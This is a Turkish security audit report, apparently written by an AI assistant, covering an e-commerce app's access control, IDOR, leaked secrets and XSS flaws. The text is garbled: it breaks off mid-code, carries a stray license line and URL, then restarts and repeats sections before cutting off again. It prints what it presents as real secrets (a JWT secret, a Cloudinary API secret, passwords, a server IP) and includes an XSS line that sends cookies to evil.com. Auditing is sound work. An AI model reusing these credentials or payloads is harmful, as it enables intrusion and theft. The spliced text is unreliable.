## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        
```


## License: unknown
https://github.com/hans2103/HKweb/blob/d7d731a35e32743672844f2f2870966ab936e4ca/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
